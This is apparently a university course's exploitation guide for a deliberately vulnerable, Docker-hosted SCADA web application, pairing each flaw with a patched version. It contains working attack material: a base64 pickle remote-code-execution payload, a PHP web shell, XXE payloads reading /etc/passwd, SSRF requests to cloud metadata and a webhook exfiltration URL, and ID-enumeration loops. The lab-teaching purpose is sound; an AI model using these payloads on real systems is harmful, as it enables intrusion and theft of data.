# SCADA Vulnerability Testing Guide

**Course:** CS437 - Cybersecurity Practices & Applications  
**Project:** Vulnerable SCADA Environment  
**Date:** January 2026

---

## Prerequisites

Before testing, ensure:
1. Docker container is running: `docker compose up`
2. Database is populated: `docker compose exec web python manage.py populate_db`
3. Application is accessible at `http://localhost:8000`

**Test Credentials:**
- Regular User: `user` / `user123`
- Admin User: `admin` / `admin123`

---

## Vulnerability 1: Authentication Bypass

### Description
Application accepts arbitrary URL parameters during authentication that override server-side authorization flags. No password validation occurs when URL parameters are provided.

### Exploitation Steps

**Method 1: Browser**
```
http://localhost:8000/vulnerable/login/?username=attacker&is_admin=true
```
- Navigate to the URL above
- Notice you're logged in as admin without entering any password
- Dashboard shows "Welcome attacker (Admin)" in the header

**Method 2: Burp Suite**
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Visit `http://localhost:8000/vulnerable/login/`
3. Enter any username/password and click Login
4. In Burp, intercept the request
5. Modify the request to add GET parameters:
   ```
   GET /vulnerable/login/?username=hacker&is_admin=true HTTP/1.1
   ```
6. Forward the request
7. You're now logged in as admin

**Method 3: curl**
```bash
curl "http://localhost:8000/vulnerable/login/?username=attacker&is_admin=true" -c cookies.txt
curl "http://localhost:8000/vulnerable/dashboard/" -b cookies.txt
```

### Expected Result
✅ Passwordless authentication as admin  
✅ Session cookie set with admin privileges  
✅ Access to admin-only features

### Patched Version
- Visit `http://localhost:8000/patched/login/`
- Try same URL parameters → Access Denied
- Patched version requires valid database credentials

---

## Vulnerability 2: Privilege Escalation

### Description
URL parameters can override session data, allowing regular users to escalate privileges to admin.

### Exploitation Steps

1. **Login as regular user:**
   ```
   http://localhost:8000/vulnerable/login/?username=user&password=user123
   ```

2. **Escalate privileges via URL manipulation:**
   ```
   http://localhost:8000/vulnerable/dashboard/?is_admin=true
   ```

3. **Verify admin access:**
   - Dashboard header shows "Welcome user (Admin)"
   - Admin-only features are now accessible
   - You can see locked devices

### Expected Result
✅ Regular user gains admin privileges  
✅ Access to restricted admin features

### Patched Version
- URL parameters are ignored in patched version
- Admin status is verified server-side from database

---

## Vulnerability 3: SQL Injection - Scenario 2a (Dashboard - Locked Device Revelation)

### Description
Django ORM Q object abuse allowing OR-based filter injection. Attackers can bypass `is_locked_out=False` filter to reveal hidden locked devices including NUCLEAR-CORE-CONTROLLER.

### Exploitation Steps

**Step 1: Login as admin (use auth bypass):**
```bash
curl "http://localhost:8000/vulnerable/login/?username=admin&is_admin=true" -c cookies.txt
```

**Step 2: Normal admin view (17-18 devices visible):**
```bash
curl "http://localhost:8000/vulnerable/dashboard/" -b cookies.txt
```

**Step 3: SQL Injection - Reveal locked devices:**
```bash
curl "http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=True" -b cookies.txt
```

**Alternative - Reveal NUCLEAR devices:**
```
http://localhost:8000/vulnerable/dashboard/?connector=OR&name__icontains=NUCLEAR
```

### Expected Result
✅ Total devices increase from 17-18 to 20-21  
✅ **NUCLEAR-CORE-CONTROLLER** appears with red background and 🔒 icon  
✅ Locked-out critical infrastructure revealed

### Visual Indicators
- Red background row = Locked device
- 🔒 icon = Device is locked out
- "NUCLEAR" in device name = Critical infrastructure

---

## Vulnerability 3: SQL Injection - Scenario 2b (Maintenance - NUCLEAR Discovery)

### Description
Similar ORM filter bypass in maintenance interface. Admin can reveal NUCLEAR devices that should be hidden from maintenance view.

### Exploitation Steps

**Step 1: Login as admin:**
```
http://localhost:8000/vulnerable/login/?username=admin&is_admin=true
```

**Step 2: Normal maintenance view (NUCLEAR devices hidden):**
```
http://localhost:8000/vulnerable/maintenance/
```

**Step 3: SQL Injection - Reveal NUCLEAR in maintenance:**
```
http://localhost:8000/vulnerable/maintenance/?connector=OR&name__icontains=NUCLEAR
```

### Expected Result
✅ NUCLEAR-CORE devices appear in maintenance interface  
✅ Bypasses need-to-know security policy  
✅ Exposes critical infrastructure maintenance status

---

## Vulnerability A: IDOR (Insecure Direct Object Reference)

### Description
No authorization check on diagnostic report access. Users can access any report by guessing/enumerating IDs.

### Exploitation Steps

**Step 1: Access specific reports:**
```bash
# Admin secret report
curl "http://localhost:8000/vulnerable/report/?id=103" -o report_103.pdf

# Normal user reports
curl "http://localhost:8000/vulnerable/report/?id=104" -o report_104.pdf
curl "http://localhost:8000/vulnerable/report/?id=105" -o report_105.pdf
```

**Step 2: Enumerate all reports (103-153):**
```bash
for i in {103..153}; do
  curl "http://localhost:8000/vulnerable/report/?id=$i" -o "report_$i.pdf"
  echo "Downloaded report $i"
done
```

### Expected Result
✅ Access to 51 diagnostic reports without authorization  
✅ Report ID 103 contains: "CONFIDENTIAL: Root Password is 'supersecret123'"  
✅ All PDFs successfully downloaded regardless of ownership

### Patched Version
- Reports below ID 10 require admin privileges
- Non-admin users receive "Access Denied: Unauthorized" message

---

## Vulnerability B: Insecure Deserialization (Pickle RCE)

### Description
Application deserializes untrusted pickle data, allowing Remote Code Execution via `__reduce__()` method.

### Exploitation Steps

**Step 1: Generate malicious pickle payload**

Run the provided script:
```bash
python3 ./create_pickle_payload.py
```

The script generates 3 payloads:

**Payload 1: Benign (Test)**
```
Base64: Z0FCUlVQVEVEX1BJQ0tMRV9EQVRBX1RIQVRfV0lMTF9DUkFTSA==
```

**Payload 2: Corrupted (Crash Test)**
```
Base64: Q09SUlVQVEVEX1BJQ0tMRV9EQVRBX1RIQVRfV0lMTF9DUkFTSA==
Result: Server crashes with pickle deserialization error
```

**Payload 3: Malicious RCE (⚠️ Educational Only)**
```
Base64: gAWVdwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFx3aG9hbWkgPiAvYXBwL3B3bmVkLnR4dCAmJiBlY2hvICJSQ0UgU1VDQ0VTUzogQ29tbWFuZCBleGVjdXRlZCBhdCAkKGRhdGUpIiA+PiAvYXBwL3B3bmVkLnR4dJSFlFKULg==

Command Executed: whoami > /app/pwned.txt && echo "RCE SUCCESS: Command executed at $(date)" >> /app/pwned.txt
```

**Step 2: Send payload to vulnerable endpoint**

Visit `http://localhost:8000/vulnerable/deserialize/` and:
1. Upload a `.pkl` file containing the malicious payload, OR
2. Paste the Base64 payload in the diagnostics field (if available)

**Step 3: Verify code execution**
```bash
# Check if RCE succeeded
docker compose exec web cat /tmp/pwned.txt

# OR check in /app directory
docker compose exec web cat /app/pwned.txt
```

### Expected Result
✅ File `/tmp/pwned.txt` or `/app/pwned.txt` created  
✅ File contains: "RCE SUCCESS: Command executed at [timestamp]"  
✅ Arbitrary command execution achieved

### Patched Version
- Uses JSON instead of pickle
- No code execution possible via JSON deserialization

---

## Vulnerability C: File Overwrite

### Description
Uploaded diagnostic scripts overwrite existing files with the same name. No versioning, no confirmation, no protection.

### Exploitation Steps

**Step 1: Upload original file**
```bash
# Create original diagnostic script
echo "ORIGINAL PRODUCTION SCRIPT - DO NOT MODIFY" > critical_diagnostic.xml
```

Visit `http://localhost:8000/vulnerable/upload/` and upload `critical_diagnostic.xml`

**Step 2: Verify original file exists**
```bash
docker compose exec web cat media/critical_diagnostic.xml
# Output: ORIGINAL PRODUCTION SCRIPT - DO NOT MODIFY
```

**Step 3: Upload malicious file with SAME NAME**
```bash
# Create malicious replacement
echo "MALICIOUS CODE - BACKDOOR INSTALLED!" > critical_diagnostic.xml
```

Visit `http://localhost:8000/vulnerable/upload/` and upload the same `critical_diagnostic.xml` again

**Step 4: Verify overwrite attack succeeded**
```bash
docker compose exec web cat media/critical_diagnostic.xml
# Output: MALICIOUS CODE - BACKDOOR INSTALLED!
```

### Expected Result
✅ Original file completely replaced  
✅ No warning or version control  
✅ Production script now contains malicious code

### Patched Version
- Uses UUID-based unique filenames
- Files never overwrite: `uuid_critical_diagnostic.xml`

---

## Vulnerability D: Unsafe Temp Files (Race Condition)

### Description
Temporary PDF reports use predictable static filename `/tmp/scada_report_temp.pdf` reused across ALL users. Concurrent requests can cause data leakage.

### Exploitation Steps

**Step 1: Request a report (any user)**
```bash
curl "http://localhost:8000/vulnerable/report/?id=103" -o report_103.pdf
```

**Step 2: Check temp file inside Docker container**
```bash
# View temp file location in code
docker compose exec web grep -n "temp_filename" vulnerable/views.py
# Output: Line 185: temp_filename = "/tmp/scada_report_temp.pdf"

# Copy temp file from container to local machine
docker cp scada_security_lab-web-1:/tmp/scada_report_temp.pdf ./temp_report.pdf

# Open the copied file
open ./temp_report.pdf  # macOS
xdg-open ./temp_report.pdf  # Linux
```

**Step 3: Race condition test**
```bash
# Terminal 1: Request report ID 1 (normal user)
curl "http://localhost:8000/vulnerable/report/?id=1" -o user1.pdf &

# Terminal 2: Immediately request report ID 103 (admin secret)
curl "http://localhost:8000/vulnerable/report/?id=103" -o user2.pdf &

# Check if user1.pdf accidentally contains admin data due to race
```

### Expected Result
✅ Same temp file path used for all users  
✅ File `/tmp/scada_report_temp.pdf` exists in container  
✅ Potential data leakage between concurrent requests

### Patched Version Test

**Step 1: Request patched report**
```
http://localhost:8000/patched/report/?id=103
```

**Step 2: Check for temp files**
```bash
# Access container bash
docker exec -it scada_security_lab-web-1 bash

# Inside container, list temp directory
ls -la /tmp/
```

**Flags explanation:**
- `-i` = Interactive (keep stdin open)
- `-t` = Allocate pseudo-TTY (terminal simulation)
- `-a` = List all entries including hidden files (starting with .)

### Expected Result (Patched)
✅ No `scada_report_temp.pdf` file in `/tmp/`  
✅ Reports served directly via HTTP response  
✅ No persistent temp files  
✅ No race condition possible

---

## Vulnerability E: Unrestricted Upload of Dangerous File Types (CWE-434)

### Description
No file type validation. Application accepts ANY file extension including executables, scripts, and web shells.

### Exploitation Steps

**Step 1: Create dangerous files**
```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > webshell.php

# Python backdoor
echo 'import os; os.system("whoami")' > backdoor.py

# Bash script
echo '#!/bin/bash\nwhoami' > malicious.sh

# Windows executable simulation
echo 'MZ' > malware.exe
```

**Step 2: Upload dangerous files**

Visit `http://localhost:8000/vulnerable/upload/` and upload:
- `webshell.php`
- `backdoor.py`
- `malicious.sh`
- `malware.exe`

**Step 3: Verify all files accepted**
```bash
docker compose exec web ls -la media/
```

### Expected Result
✅ All dangerous file types accepted  
✅ `.php`, `.py`, `.sh`, `.exe` files uploaded successfully  
✅ No validation or filtering

### Patched Version
- Whitelist: Only `.pdf`, `.xml`, `.txt`, `.csv` allowed
- Other extensions rejected: "Invalid file type"

---

## Vulnerability F: Server-Side Request Forgery (SSRF)

### Description
Application makes server-side HTTP requests to attacker-controlled URLs without validation. Allows internal network scanning and data exfiltration.

### Exploitation Steps

**Method 1: Access Internal Services**
```bash
# Access admin panel from server-side
curl -X POST "http://localhost:8000/vulnerable/ssrf/" \
  -d "url=http://127.0.0.1:8000/vulnerable/dashboard/"

# Access local services
curl -X POST "http://localhost:8000/vulnerable/ssrf/" \
  -d "url=http://127.0.0.1:8000"
```

**Method 2: Browser Test**

Visit: `http://localhost:8000/vulnerable/ssrf/`

In the URL field, enter:
```
http://127.0.0.1:8000/vulnerable/dashboard/
```

Or:
```
http://127.0.0.1:8000
```

Click "Check Node Status"

### Expected Result
✅ Server-side request executed successfully  
✅ HTML response body displayed (dashboard content visible)  
✅ Internal services accessible from server context  
✅ If you see the full HTML of the dashboard page, SSRF is successful

### Additional SSRF Tests
```bash
# Scan internal network
curl -X POST "http://localhost:8000/vulnerable/ssrf/" \
  -d "url=http://192.168.1.1"

# Cloud metadata (AWS EC2)
curl -X POST "http://localhost:8000/vulnerable/ssrf/" \
  -d "url=http://169.254.169.254/latest/meta-data/"

# Data exfiltration via webhook
curl -X POST "http://localhost:8000/vulnerable/ssrf/" \
  -d "url=https://webhook.site/your-unique-id"
```

### Patched Version
- Domain whitelist: Only `example.com` and `scada-update-server.com`
- Internal IPs blocked (127.0.0.1, 192.168.x.x, 10.x.x.x)
- Error message: "Domain not allowed"

---

## Vulnerability G: XXE (XML External Entity Injection)

### Description
XML parser configured with `resolve_entities=True` allows reading arbitrary files from the server filesystem.

### Exploitation Steps

**Step 1: Use provided XXE payloads**

The project includes pre-made XXE attack files:
- `xxe_attack.xml` - Reads `/etc/passwd`
- `xxe_hostname.xml` - Reads `/etc/hostname`

**Step 2: Upload XXE payload**

Visit `http://localhost:8000/vulnerable/upload/` and upload either:
- `xxe_attack.xml`
- `xxe_hostname.xml`

**Step 3: Check response**

The server response will contain the file contents embedded in the XML output.

### XXE Payload Examples

**Read `/etc/passwd`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <content>&xxe;</content>
</data>
```

**Read `/etc/hostname`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY hostname SYSTEM "file:///etc/hostname">
]>
<diagnostic>
  <container>&hostname;</container>
</diagnostic>
```

**Read application settings (attempt):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY settings SYSTEM "file:///app/scada_system/settings.py">
]>
<data>
  <content>&settings;</content>
</data>
```

### Expected Result
✅ File contents successfully read from server  
✅ `/etc/passwd` reveals user accounts: root, daemon, www-data, _apt, nobody  
✅ `/etc/hostname` reveals container hostname  
✅ Even if XML parsing "fails", file was already read server-side

### Important Note
Even if you see an XML parsing error, the XXE attack may have succeeded. Check the error message carefully - it might contain file contents.

### Patched Version
- `resolve_entities=False` in XML parser
- `no_network=True` to disable network access
- External entities disabled completely

---

## Vulnerability 10: Security Misconfiguration - Unauthorized Monitoring Logs Access

### Description
Security oversight where `/monitoring/` endpoint lacks authorization checks. Any logged-in user can access sensitive attack logs, IP addresses, and security events.

### Exploitation Steps

**Step 1: Login as regular user (non-admin)**
```bash
curl "http://localhost:8000/vulnerable/login/?username=user&password=user123" -c cookies.txt
```

**Step 2: Access monitoring logs**
```bash
curl "http://localhost:8000/monitoring/" -b cookies.txt
```

Or visit in browser:
```
http://localhost:8000/monitoring/
```

**Step 3: Analyze exposed information**

Accessible data includes:
- Attack type classifications (SQL Injection, XXE, SSRF, etc.)
- Attacker IP addresses
- Attack payloads and patterns
- Severity levels (CRITICAL/HIGH/MEDIUM/LOW)
- Blocked IP list
- System defensive capabilities
- Successful/failed attack attempts

### Expected Result
✅ Non-admin user can view all security logs  
✅ Information disclosure of security posture  
✅ Attack reconnaissance data leaked  
✅ No authorization check performed

### Additional: DEBUG Mode Information Disclosure

**Test wrong credentials:**
```
http://localhost:8000/vulnerable/login/?username=test&password=wrong
```

### Expected Result (if DEBUG=True)
✅ Detailed Django error page displayed  
✅ SECRET_KEY exposed in settings  
✅ Database file path revealed  
✅ Full server configuration visible

### Patched Version
- `http://localhost:8000/monitoring/patched/` requires admin authentication
- Non-admin users receive "Access Denied" (HTTP 403)
- DEBUG mode disabled in production

---

## Vulnerability 11: Maintenance Interface CSRF/Authorization

### Description
SCADA Maintenance Interface has multiple flaws: missing CSRF protection, lack of server-side authorization, and client-side only security checks that can be bypassed.

### Exploitation Steps

**Method 1: JavaScript Bypass**

1. Login as regular user
2. Navigate to `http://localhost:8000/vulnerable/maintenance/`
3. You see a popup: "Access Denied" and redirect
4. **Bypass:** Open browser developer console (F12)
5. Disable JavaScript (Chrome: Settings → Site Settings → JavaScript → Block)
6. Refresh page
7. Maintenance interface loads without redirect!

**Method 2: Burp Suite Intercept**

1. Configure Burp proxy
2. Login as regular user
3. Navigate to maintenance page
4. Intercept the response in Burp
5. Remove or modify the JavaScript redirect code
6. Forward modified response
7. Full access to maintenance interface

**Method 3: Direct API Access**

```bash
# Login as regular user
curl "http://localhost:8000/vulnerable/login/?username=user&password=user123" -c cookies.txt

# Directly access maintenance interface
curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt

# Assign technician (bypassing CSRF)
curl -X POST "http://localhost:8000/vulnerable/assign/5/" \
  -b cookies.txt \
  -d "technician_name=Hacker&action=Installing backdoor"
```

### Expected Result
✅ Client-side security bypassed  
✅ Regular user can view maintenance data  
✅ Can assign technicians without admin privileges  
✅ CSRF attacks possible due to `@csrf_exempt`

### Patched Version
- Server-side admin check: `if not user.get('is_admin'): return 403`
- CSRF protection enabled: `@csrf_protect`
- Input validation and sanitization
- LOTO (Lockout/Tagout) compliance checks

---

## Testing Checklist

Use this checklist to verify all vulnerabilities:

- [ ] **Vulnerability 1:** Authentication Bypass (URL params)
- [ ] **Vulnerability 2:** Privilege Escalation (session override)
- [ ] **Vulnerability 3a:** SQL Injection Dashboard (locked devices)
- [ ] **Vulnerability 3b:** SQL Injection Maintenance (NUCLEAR reveal)
- [ ] **Vulnerability A:** IDOR (report enumeration 103-153)
- [ ] **Vulnerability B:** Deserialization RCE (pickle payload)
- [ ] **Vulnerability C:** File Overwrite (same filename)
- [ ] **Vulnerability D:** Unsafe Temp Files (race condition)
- [ ] **Vulnerability E:** Unrestricted Upload (dangerous file types)
- [ ] **Vulnerability F:** SSRF (internal network access)
- [ ] **Vulnerability G:** XXE (file read via XML)
- [ ] **Vulnerability 10:** Security Misconfiguration (monitoring access)
- [ ] **Vulnerability 11:** Maintenance CSRF (authorization bypass)

---

## Docker Useful Commands

```bash
# Start container
docker compose up -d

# Stop container
docker compose down

# View logs
docker compose logs -f web

# Access container shell
docker exec -it scada_security_lab-web-1 bash

# Copy files from container
docker cp scada_security_lab-web-1:/tmp/file.txt ./local-file.txt

# Execute Python in container
docker compose exec web python manage.py shell

# Check processes
docker compose exec web ps aux

# View file contents
docker compose exec web cat /path/to/file

# List directory
docker compose exec web ls -la /tmp/

# Find files
docker compose exec web find /app -name "*.pdf"
```

---

## Monitoring Dashboard

Access real-time attack detection and logging:

**Vulnerable Version (No Auth):**
```
http://localhost:8000/monitoring/
```

**Patched Version (Admin Only):**
```
http://localhost:8000/monitoring/patched/
```

### Features:
- 13 attack types detected automatically
- Severity classification (CRITICAL/HIGH/MEDIUM/LOW)
- Brute force detection (5 failures in 5 minutes)
- Admin actions: Block IP, Revoke Session, Resolve Incident
- Real-time statistics dashboard
- Filter by severity, resolution status, attack type

---

## Additional Resources

**Burp Suite Configuration:**
1. Download Burp Suite Community Edition
2. Start Burp and configure proxy (default: 127.0.0.1:8080)
3. Configure browser to use proxy
4. Import Burp CA certificate for HTTPS interception
5. Use Proxy → Intercept tab to modify requests
6. Use Repeater for manual payload testing

**curl Tips:**
```bash
# Save cookies
curl URL -c cookies.txt

# Use cookies
curl URL -b cookies.txt

# POST data
curl -X POST URL -d "key=value"

# Upload file
curl -X POST URL -F "file=@filename.txt"

# Follow redirects
curl -L URL

# Show headers
curl -i URL

# Verbose output
curl -v URL
```

---

## Notes

⚠️ **Important Reminders:**

1. All testing should be performed in isolated environment (Docker container)
2. RCE payloads are for educational purposes only
3. Never test on production systems without authorization
4. Some attacks require admin privileges - chain with auth bypass
5. File paths differ between host and container (use `docker exec` to verify)
6. TTY issues? Use VS Code integrated terminal instead of system terminal

---

## Report Issues

If vulnerabilities don't work as expected:

1. Check Docker container is running: `docker ps`
2. Verify database is populated: `docker compose exec web python manage.py shell`
3. Check application logs: `docker compose logs web`
4. Ensure correct URL (vulnerable vs patched)
5. Verify session cookies are set
6. Try from clean browser session (clear cookies)

---

**End of Testing Guide**

For detailed vulnerability analysis and mitigation strategies, refer to `report.tex`.
